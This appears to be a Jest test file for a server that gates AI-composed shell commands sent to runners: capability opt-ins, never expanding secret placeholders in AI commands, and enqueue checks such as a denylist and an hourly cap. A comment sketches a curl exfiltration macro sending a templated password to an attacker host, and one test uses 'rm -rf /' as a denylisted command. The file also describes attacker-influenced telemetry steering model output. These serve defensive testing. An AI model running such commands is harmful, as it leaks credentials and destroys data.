import logger from "Common/Server/Utils/Logger";
import RunnerService from "Common/Server/Services/RunnerService";
import RunnerJobService, {
  MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR,
} from "Common/Server/Services/RunnerJobService";
import KubernetesClusterAiAccessService, {
  RegisterKubernetesAgentRunnerResult,
} from "Common/Server/Services/KubernetesClusterAiAccessService";
import Runner from "Common/Models/DatabaseModels/Runner";
import RunnerJob from "Common/Models/DatabaseModels/RunnerJob";
import RunbookStepType from "Common/Types/Runbook/RunbookStepType";
import RunnerJobOrigin from "Common/Types/Runbook/RunnerJobOrigin";
import RunnerJobStatus from "Common/Types/Runbook/RunnerJobStatus";
import BadDataException from "Common/Types/Exception/BadDataException";
import ForbiddenException from "Common/Types/Exception/ForbiddenException";
import {
  ExpressRequest,
  ExpressResponse,
  NextFunction,
} from "Common/Server/Utils/Express";
import Response from "Common/Server/Utils/Response";
import Dictionary from "Common/Types/Dictionary";
import { JSONObject } from "Common/Types/JSON";
import ObjectID from "Common/Types/ObjectID";
import PositiveNumber from "Common/Types/PositiveNumber";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test,
} from "@jest/globals";

/*
 * ---------------------------------------------------------------------------
 * Contract under test — the two chokepoints AI-composed commands must pass:
 *
 *   1. The agent ingress. canRunAiCommands is the per-Runner operator consent
 *      for executing AI-composed commands. The heartbeat must report it
 *      (opt-in: only an explicit `true` grants), and /claim-next-job must map
 *      the Runner's capabilities to the job origins it may lease:
 *      canRunRunbooks (default ON) entitles it to Runbook jobs,
 *      canRunAiCommands (default OFF) to BOTH AI origins — AiRemediation
 *      (policy-tiered commands) and AiInvestigation (read-only kubectl) —
 *      independently, so revoking one capability never starves the other's
 *      work. With no capabilities left, the ingress answers { job: null }
 *      WITHOUT touching RunnerJobService, so a fully revoked Runner can never
 *      lease anything. The claim response carries the job's origin, omits
 *      runbookExecutionId for AiRemediation jobs (they have none), and still
 *      resolves SSH credentials at claim time exactly like runbook jobs. It
 *      must ALSO never expand {{runbookSecrets.*}} placeholders in an
 *      AI-composed command — that substitution is for human-authored runbook
 *      scripts only, and doing it for AiRemediation jobs would be an
 *      exfiltration primitive.
 *
 *      Two more rules on the same claim: a credential-less Kubectl job runs
 *      with the claiming pod's own ServiceAccount, so it is served ONLY to
 *      the in-cluster Runner whose posture names the job's cluster (any
 *      other Runner gets the job failed, not served); and the Runner may
 *      narrow what it is served with `stepTypes`, while a kubernetes-agent
 *      Runner (by its server-owned name, or by its posture) is narrowed to
 *      kubectl by the server regardless, so an AI-composed shell command
 *      never reaches the agent pod. That Runner is also never handed
 *      credential material or runbook secrets: its identity can be minted
 *      with the telemetry ingestion key.
 *
 *      Registration (/register-kubernetes-agent) passes the Runner's
 *      previous key through so a live Runner can prove continuity, reports
 *      the binding state back, and lets a refusal (403) reach the Runner.
 *      /disconnect lets a Runner sign off so its replacement is admitted at
 *      once.
 *
 *   2. RunnerJobService.enqueueAiCommand — the server-side gate on the path
 *      an LLM's output takes to a shell. It must re-validate what the tool
 *      layer already checked (step type, non-empty command, the hard
 *      denylist, SSH credential requirement), refuse a target that is not
 *      one of the project's Runners or is a kubernetes-agent Runner,
 *      enforce the project-wide hourly ceiling on AI command jobs, and
 *      persist the job in the
 *      same layout the runbook executors use: Bash carries the command as
 *      the script; SSH carries an empty script plus a structured payload,
 *      never credential material.
 * ---------------------------------------------------------------------------
 */

const ONE_HOUR_IN_MS: number = 60 * 60 * 1000;

/*
 * The shape TypeORM's Raw() find-operator exposes — what
 * QueryHelper.greaterThan builds. Declared structurally so the assertion
 * does not have to reach into TypeORM's types.
 */
type RawQueryFilter = {
  type: string;
  getSql?: ((alias: string) => string) | undefined;
  objectLiteralParameters?: Record<string, unknown> | undefined;
};

type RouterFunction = (
  req: ExpressRequest,
  res: ExpressResponse,
  next: NextFunction,
) => void | Promise<void>;

type MockRoute = {
  method: string;
  uri: string;
  middleware: RouterFunction;
  handlerFunction: RouterFunction;
};

type MockRouter = {
  get: jest.Mock;
  post: jest.Mock;
  put: jest.Mock;
  delete: jest.Mock;
};

const mockRoutes: Array<MockRoute> = [];

type RegisterRouteFunction = (
  method: string,
) => (
  uri: string,
  middleware: RouterFunction,
  handlerFunction: RouterFunction,
) => void;

const registerRoute: RegisterRouteFunction = (method: string) => {
  return (
    uri: string,
    middleware: RouterFunction,
    handlerFunction: RouterFunction,
  ): void => {
    mockRoutes.push({
      method: method.toUpperCase(),
      uri,
      middleware,
      handlerFunction,
    });
  };
};

const mockRouter: MockRouter = {
  get: jest.fn().mockImplementation(registerRoute("get")),
  post: jest.fn().mockImplementation(registerRoute("post")),
  put: jest.fn().mockImplementation(registerRoute("put")),
  delete: jest.fn().mockImplementation(registerRoute("delete")),
};

jest.mock("Common/Server/Utils/Express", () => {
  const actual: Record<string, unknown> = jest.requireActual(
    "Common/Server/Utils/Express",
  ) as Record<string, unknown>;

  return {
    ...actual,
    __esModule: true,
    default: {
      ...((actual["default"] as Record<string, unknown>) || {}),
      getRouter: (): MockRouter => {
        return mockRouter;
      },
    },
  };
});

jest.mock("Common/Server/Utils/Response", () => {
  return {
    __esModule: true,
    default: {
      sendJsonObjectResponse: jest.fn(),
      sendErrorResponse: jest.fn(),
      sendEmptySuccessResponse: jest.fn(),
      sendEntityResponse: jest.fn(),
    },
  };
});

/*
 * The secrets util imports VMUtil -> isolated-vm, a native binding that is
 * not installed for this suite (and not under test). Claiming a Bash job
 * reaches populateInScript, so both functions get real-ish implementations
 * in beforeEach (no secrets, script passes through untouched).
 */
jest.mock("../../FeatureSet/Runbook/Utils/Secrets", () => {
  return {
    __esModule: true,
    default: {
      loadForAgent: jest.fn(),
      populateInScript: jest.fn(),
    },
  };
});

/*
 * Credential resolution is a DB read scoped to the claiming Runner; mocked
 * at the module boundary so the SSH claim test controls exactly what the
 * ingress hands back on the wire.
 */
jest.mock("../../FeatureSet/Runbook/Utils/Credentials", () => {
  return {
    __esModule: true,
    default: {
      resolveForJob: jest.fn(),
    },
  };
});

// Import AFTER the jest.mock calls above (they are hoisted by jest).
import RunnerIngressAPI from "../../FeatureSet/Runbook/API/RunnerIngress";
import RunnerAuthorization from "../../FeatureSet/Runbook/Middleware/RunnerAuthorization";
import { RunnerExpressRequest } from "../../FeatureSet/Runbook/Types/Request";
import RunbookSecretsUtil from "../../FeatureSet/Runbook/Utils/Secrets";
import RunbookCredentialsUtil from "../../FeatureSet/Runbook/Utils/Credentials";

const HEARTBEAT_ROUTE: string = "/heartbeat";
const CLAIM_ROUTE: string = "/claim-next-job";

const PROJECT_ID: ObjectID = new ObjectID(
  "22222222-2222-4222-8222-222222222222",
);
const AI_RUN_ID: ObjectID = new ObjectID(
  "33333333-3333-4333-8333-333333333333",
);
const SUGGESTION_ID: ObjectID = new ObjectID(
  "44444444-4444-4444-8444-444444444444",
);
const TARGET_AGENT_ID: ObjectID = new ObjectID(
  "55555555-5555-4555-8555-555555555555",
);
const JOB_ID: ObjectID = new ObjectID("66666666-6666-4666-8666-666666666666");

/*
 * A script that LOOKS harmless on an approval card but expands to plaintext
 * if the ingress ever runs secret substitution over it.
 */
const SECRET_PLACEHOLDER_SCRIPT: string =
  "curl -u admin:{{runbookSecrets.PROD_PASSWORD}} https://internal.example.com/api";

type RouteCallResult = {
  thrownToNext: unknown;
  nextCallCount: number;
};

function matchRoute(method: string, uri: string): MockRoute {
  const route: MockRoute | undefined = mockRoutes.find((route: MockRoute) => {
    return route.method === method.toUpperCase() && route.uri === uri;
  });

  if (!route) {
    throw new Error(`Route ${method} ${uri} was never registered`);
  }

  return route;
}

/*
 * The ingress handlers read req.runner, which the auth middleware
 * (RunnerAuthorization.isAuthorizedAgent) sets from the row it loaded.
 * The middleware is not under test here, so the request is constructed with
 * the property already populated — exactly what the handler receives.
 */
async function callRoute(data: {
  uri: string;
  agent?: Runner | undefined;
  body?: JSONObject | undefined;
  /*
   * What the ingestion-key middleware puts on the request for the
   * registration route (TelemetryRequest.projectId). Not under test here,
   * so the request is constructed with it already populated.
   */
  projectId?: ObjectID | undefined;
}): Promise<RouteCallResult> {
  const req: RunnerExpressRequest = {
    params: {} as Dictionary<string>,
    query: {},
    body: data.body || {},
    headers: {},
    runner: data.agent,
    ...(data.projectId ? { projectId: data.projectId } : {}),
  } as unknown as RunnerExpressRequest;

  const res: ExpressResponse = {
    send: jest.fn(),
    json: jest.fn(),
    status: jest.fn().mockReturnThis(),
  } as unknown as ExpressResponse;

  const next: jest.Mock = jest.fn();

  await matchRoute("POST", data.uri).handlerFunction(
    req,
    res,
    next as unknown as NextFunction,
  );

  return {
    thrownToNext: next.mock.calls[0] ? next.mock.calls[0][0] : undefined,
    nextCallCount: next.mock.calls.length,
  };
}

function lastJsonResponse(): JSONObject {
  const calls: Array<Array<unknown>> = (
    Response.sendJsonObjectResponse as unknown as jest.Mock
  ).mock.calls as Array<Array<unknown>>;

  expect(calls.length).toBeGreaterThan(0);

  return calls[calls.length - 1]![2] as JSONObject;
}

describe("AI command capability gating on the agent ingress", () => {
  let agentId: ObjectID;
  let projectId: ObjectID;

  let claimNextJobSpy: jest.SpyInstance;

  /*
   * Fake row as the auth middleware would hand it over. Capability columns
   * are only present when explicitly given, so `undefined` here is exactly
   * the pre-migration / unselected-column case.
   */
  function buildAgent(data: {
    canRunRunbooks?: boolean | undefined;
    canRunCodeFixTasks?: boolean | undefined;
    canRunAiCommands?: boolean | undefined;
    // The Kubernetes posture the Runner last reported, when it has one.
    hostInfo?: JSONObject | undefined;
  }): Runner {
    return {
      id: agentId,
      projectId: projectId,
      name: "test-runner",
      ...(data.canRunRunbooks !== undefined
        ? { canRunRunbooks: data.canRunRunbooks }
        : {}),
      ...(data.canRunCodeFixTasks !== undefined
        ? { canRunCodeFixTasks: data.canRunCodeFixTasks }
        : {}),
      ...(data.canRunAiCommands !== undefined
        ? { canRunAiCommands: data.canRunAiCommands }
        : {}),
      ...(data.hostInfo !== undefined ? { hostInfo: data.hostInfo } : {}),
    } as unknown as Runner;
  }

  function buildClaimedJob(data: {
    origin: RunnerJobOrigin;
    stepType: RunbookStepType;
    script: string;
    runbookExecutionId?: ObjectID | undefined;
    payload?: JSONObject | undefined;
  }): RunnerJob {
    return {
      id: JOB_ID,
      ...(data.runbookExecutionId
        ? { runbookExecutionId: data.runbookExecutionId }
        : {}),
      origin: data.origin,
      stepId: "cmd-1",
      stepType: data.stepType,
      script: data.script,
      timeoutInMs: 60_000,
      leaseExpiresAt: new Date("2026-08-04T00:00:30.000Z"),
      ...(data.payload ? { payload: data.payload } : {}),
    } as unknown as RunnerJob;
  }

  function claimedOrigins(callIndex: number): Array<RunnerJobOrigin> {
    const claimArgs: { allowedOrigins: Array<RunnerJobOrigin> } =
      claimNextJobSpy.mock.calls[callIndex]![0] as {
        allowedOrigins: Array<RunnerJobOrigin>;
      };

    return claimArgs.allowedOrigins;
  }

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();

    agentId = ObjectID.generate();
    projectId = ObjectID.generate();

    jest.spyOn(RunnerService, "heartbeat").mockResolvedValue(undefined);
    claimNextJobSpy = jest
      .spyOn(RunnerJobService, "claimNextJob")
      .mockResolvedValue(null);

    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
      [],
    );
    (
      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
    ).mockImplementation((data: { script: string }): string => {
      return data.script;
    });
    (
      RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
    ).mockResolvedValue(null);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe("POST /heartbeat reports canRunAiCommands", () => {
    /*
     * Opt-in semantics: only an explicit `true` on the row grants the AI
     * command capability — undefined (pre-migration row / unselected
     * column) must read as OFF, unlike canRunRunbooks which defaults ON.
     */
    test("reports canRunAiCommands true only when the row grants it, alongside the other two capabilities", async () => {
      const result: RouteCallResult = await callRoute({
        uri: HEARTBEAT_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(lastJsonResponse()).toEqual({
        status: "ok",
        capabilities: {
          canRunRunbooks: true,
          canRunCodeFixTasks: false,
          canRunAiCommands: true,
        },
      });
    });

    test("reports canRunAiCommands false when the column is undefined (opt-in default)", async () => {
      await callRoute({
        uri: HEARTBEAT_ROUTE,
        agent: buildAgent({}),
      });

      expect(lastJsonResponse()).toEqual({
        status: "ok",
        capabilities: {
          canRunRunbooks: true,
          canRunCodeFixTasks: false,
          canRunAiCommands: false,
        },
      });
    });

    test("reports canRunAiCommands false when the row explicitly revokes it", async () => {
      await callRoute({
        uri: HEARTBEAT_ROUTE,
        agent: buildAgent({
          canRunRunbooks: true,
          canRunCodeFixTasks: true,
          canRunAiCommands: false,
        }),
      });

      expect(lastJsonResponse()).toEqual({
        status: "ok",
        capabilities: {
          canRunRunbooks: true,
          canRunCodeFixTasks: true,
          canRunAiCommands: false,
        },
      });
    });
  });

  describe("POST /claim-next-job maps capabilities to allowed job origins", () => {
    test("asks for the runbook origin and both AI origins when both capabilities are on", async () => {
      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true, canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      /*
       * canRunAiCommands covers read-only investigation kubectl as well as
       * remediation commands: one operator consent, both AI origins.
       */
      expect(claimedOrigins(0)).toEqual([
        RunnerJobOrigin.Runbook,
        RunnerJobOrigin.AiRemediation,
        RunnerJobOrigin.AiInvestigation,
      ]);
    });

    /*
     * The independence guarantee: revoking runbooks must not starve AI
     * command work. The Runner is still served an AiRemediation job.
     */
    test("serves an AiRemediation job to a runbook-revoked Runner with canRunAiCommands on", async () => {
      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.Bash,
          script: "systemctl restart nginx",
        }),
      );

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: false, canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([
        RunnerJobOrigin.AiRemediation,
        RunnerJobOrigin.AiInvestigation,
      ]);

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
      expect(job["jobId"]).toBe(JOB_ID.toString());
    });

    test("asks for runbook jobs only when canRunAiCommands is off", async () => {
      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true, canRunAiCommands: false }),
      });

      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([RunnerJobOrigin.Runbook]);
    });

    test("asks for runbook jobs only when canRunAiCommands is undefined (opt-in default)", async () => {
      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true }),
      });

      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([RunnerJobOrigin.Runbook]);
    });

    /*
     * The load-bearing assertion: with every capability revoked,
     * claimNextJob is NEVER called — the fully revoked Runner is answered
     * "no work for you", not an error, and can never lease anything.
     */
    test("answers { job: null } without touching the job service when both capabilities are off", async () => {
      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: false, canRunAiCommands: false }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(claimNextJobSpy).not.toHaveBeenCalled();
      expect(lastJsonResponse()).toEqual({ job: null });
    });
  });

  describe("POST /claim-next-job response shape for AiRemediation jobs", () => {
    test("includes the job's origin and omits runbookExecutionId when the job has none", async () => {
      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.Bash,
          script: "systemctl restart nginx",
        }),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["origin"]).toBe(RunnerJobOrigin.AiRemediation);
      expect(job).not.toHaveProperty("runbookExecutionId");
      expect(job["jobId"]).toBe(JOB_ID.toString());
      expect(job["script"]).toBe("systemctl restart nginx");
    });

    test("still includes runbookExecutionId and a Runbook origin for runbook jobs", async () => {
      const executionId: ObjectID = ObjectID.generate();

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.Runbook,
          stepType: RunbookStepType.Bash,
          script: "echo hello",
          runbookExecutionId: executionId,
        }),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true }),
      });

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["origin"]).toBe(RunnerJobOrigin.Runbook);
      expect(job["runbookExecutionId"]).toBe(executionId.toString());
    });

    /*
     * SSH AI jobs reuse the runbook credential machinery: the payload rides
     * through to the Runner untouched, and the credential referenced by
     * payload.credentialId is resolved at claim time, scoped to the
     * claiming Runner and its project — never stored on the job row.
     */
    test("passes the SSH payload through and resolves the credential for the claiming Runner", async () => {
      const credentialId: string = ObjectID.generate().toString();
      const resolvedCredential: JSONObject = {
        host: "10.0.0.5",
        port: 22,
        username: "deploy",
        privateKey: "ssh-key-material",
      };

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.SSH,
          script: "",
          payload: {
            credentialId: credentialId,
            command: "systemctl restart nginx",
          },
        }),
      );
      (
        RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
      ).mockResolvedValue(resolvedCredential);

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);

      const resolveCall: {
        credentialId: string;
        agentId: ObjectID;
        projectId: ObjectID;
      } = (RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock).mock
        .calls[0]![0] as {
        credentialId: string;
        agentId: ObjectID;
        projectId: ObjectID;
      };

      expect(resolveCall.credentialId).toBe(credentialId);
      expect(resolveCall.agentId.toString()).toBe(agentId.toString());
      expect(resolveCall.projectId.toString()).toBe(projectId.toString());

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["origin"]).toBe(RunnerJobOrigin.AiRemediation);
      expect(job).not.toHaveProperty("runbookExecutionId");
      expect(job["stepType"]).toBe(RunbookStepType.SSH);
      expect(job["payload"]).toEqual({
        credentialId: credentialId,
        command: "systemctl restart nginx",
      });
      expect(job["credential"]).toEqual(resolvedCredential);
    });
  });

  /*
   * The exfiltration fix.
   *
   * {{runbookSecrets.NAME}} expansion exists for RUNBOOK scripts, every one
   * of which a human authored. An AI-composed command is model output shaped
   * by telemetry an attacker can influence, and it is reviewed as literal
   * text on the approval card. If the ingress expanded placeholders there,
   * `curl -u admin:{{runbookSecrets.PROD_PASSWORD}} https://attacker...`
   * would read as harmless on the card and arrive at the shell holding the
   * plaintext secret — a one-line exfiltration macro that also lands in the
   * job's captured output. So the placeholder must be served through
   * VERBATIM for AiRemediation jobs, and the secrets util must not even be
   * consulted (nothing to leak if nothing is loaded). AI commands reach
   * credentials only via the credentialId path, which never exposes the
   * material to the model.
   */
  describe("POST /claim-next-job never substitutes secrets into AI-composed commands", () => {
    test("serves an AiRemediation script with its {{runbookSecrets.*}} placeholder intact and never calls the secrets util", async () => {
      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.Bash,
          script: SECRET_PLACEHOLDER_SCRIPT,
        }),
      );

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["script"]).toBe(SECRET_PLACEHOLDER_SCRIPT);
      expect(job["script"]).toContain("{{runbookSecrets.PROD_PASSWORD}}");
      expect(job["script"]).not.toContain("hunter2");
    });

    /*
     * Same guarantee for the SSH shape, where the command rides in the
     * payload instead of the script: the payload is passed through as-is
     * and the secrets util is still never consulted.
     */
    test("passes an AiRemediation SSH payload command through with its placeholder intact", async () => {
      const credentialId: string = ObjectID.generate().toString();

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.SSH,
          script: "",
          payload: {
            credentialId: credentialId,
            command: SECRET_PLACEHOLDER_SCRIPT,
          },
        }),
      );
      (
        RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
      ).mockResolvedValue({ host: "10.0.0.5", username: "deploy" });

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
      const payload: JSONObject = job["payload"] as JSONObject;

      expect(payload["command"]).toBe(SECRET_PLACEHOLDER_SCRIPT);
    });

    /*
     * The other half of the fix: runbook scripts must still get their
     * secrets. The identical script, served to a Runbook-origin job, IS
     * substituted — proving the skip is keyed on the job's origin and not
     * on something that would quietly break runbooks.
     */
    test("still substitutes secrets for a Runbook-origin job carrying the same script", async () => {
      const substituted: string =
        "curl -u admin:hunter2 https://internal.example.com/api";
      const secrets: Array<unknown> = [{ name: "PROD_PASSWORD" }];

      (
        RunbookSecretsUtil.loadForAgent as unknown as jest.Mock
      ).mockResolvedValue(secrets);
      (
        RunbookSecretsUtil.populateInScript as unknown as jest.Mock
      ).mockReturnValue(substituted);

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.Runbook,
          stepType: RunbookStepType.Bash,
          script: SECRET_PLACEHOLDER_SCRIPT,
          runbookExecutionId: ObjectID.generate(),
        }),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true }),
      });

      expect(RunbookSecretsUtil.loadForAgent).toHaveBeenCalledTimes(1);
      expect(
        (
          RunbookSecretsUtil.loadForAgent as unknown as jest.Mock
        ).mock.calls[0]![0]!.toString(),
      ).toBe(agentId.toString());

      expect(RunbookSecretsUtil.populateInScript).toHaveBeenCalledTimes(1);
      expect(RunbookSecretsUtil.populateInScript).toHaveBeenCalledWith({
        script: SECRET_PLACEHOLDER_SCRIPT,
        secrets: secrets,
      });

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["script"]).toBe(substituted);
    });
  });
});

describe("RunnerJobService.enqueueAiCommand", () => {
  let createSpy: jest.SpyInstance;
  let countBySpy: jest.SpyInstance;

  function enqueueData(
    overrides: Partial<Record<string, unknown>> = {},
  ): Parameters<typeof RunnerJobService.enqueueAiCommand>[0] {
    return {
      projectId: PROJECT_ID,
      aiRunId: AI_RUN_ID,
      autoRemediationSuggestionId: SUGGESTION_ID,
      stepId: "cmd-1",
      stepType: RunbookStepType.Bash,
      targetAgentId: TARGET_AGENT_ID,
      command: "systemctl restart nginx",
      timeoutInMs: 60_000,
      ...overrides,
    } as Parameters<typeof RunnerJobService.enqueueAiCommand>[0];
  }

  function createdRow(): RunnerJob {
    expect(createSpy).toHaveBeenCalledTimes(1);

    const createArgs: { data: RunnerJob } = createSpy.mock.calls[0]![0] as {
      data: RunnerJob;
    };

    return createArgs.data;
  }

  beforeEach(() => {
    /*
     * The rejection tests throw through @CaptureSpan, which records the
     * exception at error level — expected here, so keep the output clean.
     */
    jest.spyOn(logger, "error").mockImplementation((): void => {
      return undefined;
    });

    createSpy = jest
      .spyOn(RunnerJobService, "create")
      .mockImplementation((args: { data: RunnerJob }): Promise<RunnerJob> => {
        return Promise.resolve(args.data);
      });

    /*
     * Every enqueue now reads the project's hourly AI command usage before
     * it writes. Default the count to zero so the tests that are about
     * something else see an empty hour.
     */
    countBySpy = jest
      .spyOn(RunnerJobService, "countBy")
      .mockResolvedValue(new PositiveNumber(0));

    /*
     * ...and the target Runner, which must be this project's and never a
     * kubernetes-agent Runner (see RunnerJobEnqueueAiCommandAgentRunner).
     * An ordinary Runner here, so these tests stay about what they test.
     */
    jest.spyOn(RunnerService, "findOneBy").mockResolvedValue({
      id: TARGET_AGENT_ID,
      _id: TARGET_AGENT_ID.toString(),
      projectId: PROJECT_ID,
      name: "office-runner",
    } as unknown as Runner);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("rejects the Kubernetes step type — AI remediation only composes Bash and SSH", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(
        enqueueData({ stepType: RunbookStepType.Kubernetes }),
      ),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("rejects the JavaScript step type", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(
        enqueueData({ stepType: RunbookStepType.JavaScript }),
      ),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("rejects an empty (or whitespace-only) command", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(enqueueData({ command: "   " })),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  /*
   * The hard denylist holds even here: this path is reached AFTER human
   * approval of a command plan, and approval must never override it.
   */
  test("rejects a denylisted command even though the tool layer already checked it", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(enqueueData({ command: "rm -rf /" })),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("rejects an SSH command without a credentialId", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(
        enqueueData({ stepType: RunbookStepType.SSH }),
      ),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("persists a Bash job with the command as the script, AiRemediation provenance, and no payload", async () => {
    await RunnerJobService.enqueueAiCommand(enqueueData({}));

    const row: RunnerJob = createdRow();

    expect(row.script).toBe("systemctl restart nginx");
    expect(row.origin).toBe(RunnerJobOrigin.AiRemediation);
    expect(row.aiRunId?.toString()).toBe(AI_RUN_ID.toString());
    expect(row.autoRemediationSuggestionId?.toString()).toBe(
      SUGGESTION_ID.toString(),
    );
    expect(row.payload).toBeUndefined();
    expect(row.runbookExecutionId).toBeUndefined();
    expect(row.projectId?.toString()).toBe(PROJECT_ID.toString());
    expect(row.targetAgentId?.toString()).toBe(TARGET_AGENT_ID.toString());
    expect(row.stepType).toBe(RunbookStepType.Bash);
    expect(row.timeoutInMs).toBe(60_000);
    expect(row.status).toBe(RunnerJobStatus.Pending);

    const createArgs: { props: Record<string, unknown> } = createSpy.mock
      .calls[0]![0] as { props: Record<string, unknown> };

    expect(createArgs.props).toEqual(expect.objectContaining({ isRoot: true }));
  });

  test("persists an SSH job with an empty script and the structured payload — never credential material", async () => {
    const credentialId: string = ObjectID.generate().toString();

    await RunnerJobService.enqueueAiCommand(
      enqueueData({
        stepType: RunbookStepType.SSH,
        credentialId: credentialId,
        command: "systemctl restart nginx",
      }),
    );

    const row: RunnerJob = createdRow();

    expect(row.script).toBe("");
    expect(row.origin).toBe(RunnerJobOrigin.AiRemediation);
    expect(row.stepType).toBe(RunbookStepType.SSH);
    expect(row.payload).toEqual({
      credentialId: credentialId,
      command: "systemctl restart nginx",
    });
  });

  test("honors claimTimeoutInMs when stamping the claim deadline", async () => {
    const claimTimeoutInMs: number = 300_000;
    const before: number = Date.now();

    await RunnerJobService.enqueueAiCommand(
      enqueueData({ claimTimeoutInMs: claimTimeoutInMs }),
    );

    const after: number = Date.now();
    const row: RunnerJob = createdRow();
    const deadlineMs: number = row.claimDeadlineAt!.getTime();

    // ceil(300000 / 1000) = exactly 300 seconds past "now" at enqueue time.
    expect(deadlineMs).toBeGreaterThanOrEqual(before + claimTimeoutInMs);
    expect(deadlineMs).toBeLessThanOrEqual(after + claimTimeoutInMs);
  });

  /*
   * The project-wide hourly storm brake. It lives at this single enqueue
   * chokepoint (rather than in the FullAuto inline tool it used to sit in)
   * so it also bounds the approved-plan and rollback paths — every route
   * from an LLM to a shell passes through here, and all of them share one
   * budget. Check-then-act, so it is a brake and not an exact quota.
   */
  describe("the project-wide hourly cap on AI command jobs", () => {
    test("rejects and creates nothing once the project is at the cap", async () => {
      countBySpy.mockResolvedValue(
        new PositiveNumber(MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR),
      );

      await expect(
        RunnerJobService.enqueueAiCommand(enqueueData({})),
      ).rejects.toThrow(BadDataException);

      expect(createSpy).not.toHaveBeenCalled();
    });

    test("rejects and creates nothing when the project is already over the cap", async () => {
      countBySpy.mockResolvedValue(
        new PositiveNumber(MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR + 7),
      );

      await expect(
        RunnerJobService.enqueueAiCommand(enqueueData({})),
      ).rejects.toThrow(BadDataException);

      expect(createSpy).not.toHaveBeenCalled();
    });

    test("proceeds at one below the cap", async () => {
      countBySpy.mockResolvedValue(
        new PositiveNumber(MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR - 1),
      );

      await RunnerJobService.enqueueAiCommand(enqueueData({}));

      const row: RunnerJob = createdRow();

      expect(row.origin).toBe(RunnerJobOrigin.AiRemediation);
      expect(row.script).toBe("systemctl restart nginx");
    });

    /*
